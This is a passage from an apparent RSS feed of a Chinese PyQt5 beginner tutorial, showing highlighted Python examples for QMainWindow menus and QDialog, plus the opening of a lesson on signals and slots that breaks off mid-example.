<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果：</p>
<p></p>
<h2>三、QMainWindow</h2>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QMainWindow, QLabel, QApplication</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QMainWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        label </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QLabel</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"这是文字~~"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        label.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setStyleSheet</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"font-size:30px;color:red"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 调用父类中的menuBar，从而对菜单栏进行操作</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        menu </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B"> self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">menuBar</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 如果是Mac的话，菜单栏不会在Window中显示而是屏幕顶部系统菜单栏位置</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 下面这一行代码使得Mac也按照Windows的那种方式在Window中显示Menu</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setNativeMenuBar</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">False</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        file_menu </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addMenu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"文件"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        file_menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addAction</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"新建"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        file_menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addAction</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"打开"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        file_menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addAction</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"保存"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit_menu </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addMenu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"编辑"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit_menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addAction</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"复制"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit_menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addAction</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"粘贴"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        edit_menu.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">addAction</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"剪切"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置中心内容显示</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setCentralWidget</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(label)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyWindow</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"我是窗口标题...."</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>效果（Mac与Windows效果稍有不同）</p>
<p></p>
<h2>四、QDialog</h2>
<p>不过对话框一般不应该作为主窗口的存在，而是通过点击操作弹出，起到提示作用</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QDialog, QPushButton, QApplication</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyDialog</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QDialog</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        ok_btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"确定"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        ok_btn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">50</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">50</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">if</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> __name__</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2"> ==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> '__main__'</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QApplication</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(sys.argv)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> MyDialog</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 设置窗口标题</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setWindowTitle</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"对话框"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 展示窗口</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    w.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">show</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">    # 程序进行循环等待状态</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">    app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">exec</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>运行效果：</p>
<p></p>
]]></content:encoded>
    </item>
    <item>
      <title>006-信号与槽</title>
      <link>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/006-%E4%BF%A1%E5%8F%B7%E4%B8%8E%E6%A7%BD.html</link>
      <guid>https://www.geekery.cn/PyQt5%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-%E7%8E%8B%E9%93%AD%E4%B8%9C/006-%E4%BF%A1%E5%8F%B7%E4%B8%8E%E6%A7%BD.html</guid>
      <source url="https://www.geekery.cn/rss.xml">006-信号与槽</source>
      <description>006-信号与槽 一、说明 信号和槽是 Qt的核心内容 1. 信号(signal) 其实就是事件（按钮点击 、内容发生改变 、窗口的关闭事件） 或者是 状态 （check选中了， togglebutton 切换。） 当程序触发了某种状态或者发生了某种事件（比如：按钮被点击了, 内容改变等等），那么即可发射出来一个信号。 2. 槽( slot) 若想捕获...</description>
      <pubDate>Thu, 29 Jan 2026 05:47:01 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>一、说明</h2>
<p><code>信号</code>和<code>槽</code>是 Qt的核心内容</p>
<h3>1. 信号(signal)</h3>
<p>其实就是事件（按钮点击 、内容发生改变 、窗口的关闭事件） 或者是 状态 （check选中了， togglebutton 切换。）</p>
<p>当程序触发了某种状态或者发生了某种事件（比如：按钮被点击了, 内容改变等等），那么即可发射出来一个<code>信号</code>。</p>
<h3>2. 槽( slot)</h3>
<p>若想捕获这个信号，然后执行相应的逻辑代码，那么就需要使用到 <code>槽</code> ， <code>槽</code>实际上是一个函数， 当<code>信号</code>发射出来后，会执行与之绑定的<code>槽</code>函数</p>
<h3>3. 将信号与槽链接</h3>
<p>为了能够实现，当点击某个按钮时执行某个逻辑，需要把具体的<code>信号</code>和具体的<code>槽</code>函数绑定到一起.</p>
<p>操作大体流程如下</p>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">对象.信号.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">connect</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(槽函数)</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p></p>
<p>需求：</p>
<div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>当出现了某一种信号（某一种事件）的时候，我们需要执行一段代码（用函数来包装这份代码。）</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>解决的办法：</p>
<div class="language-txt line-numbers-mode" data-highlighter="shiki" data-ext="txt" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-txt"><span class="line"><span>信号和槽</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><h2>二、案例 1</h2>
<h3>功能：接收信号</h3>
<div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-python"><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> sys</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> PyQt5.QtWidgets </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> QApplication, QWidget, QPushButton</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">class</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B"> MyWindow</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B">QWidget</span><span style="--shiki-light:#C18401;--shiki-dark:#ABB2BF">)</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">:</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2"> __init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">        super</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">().</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2">__init__</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">    def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> init_ui</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E5C07B;--shiki-dark-font-style:italic">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">):</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 更改当前Widge的宽高</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">        self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">resize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">500</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">300</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 创建一个按钮</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2">=</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF"> QPushButton</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">"点我点我"</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B">self</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 设置窗口位置、宽高</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">        btn.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF">setGeometry</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">200</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">200</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">100</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">, </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">30</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 将按钮被点击时触发的信号与我们定义的函数（方法）进行绑定</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">        # 注意：这里没有()，即写函数的名字，而不是名字()</span></span>
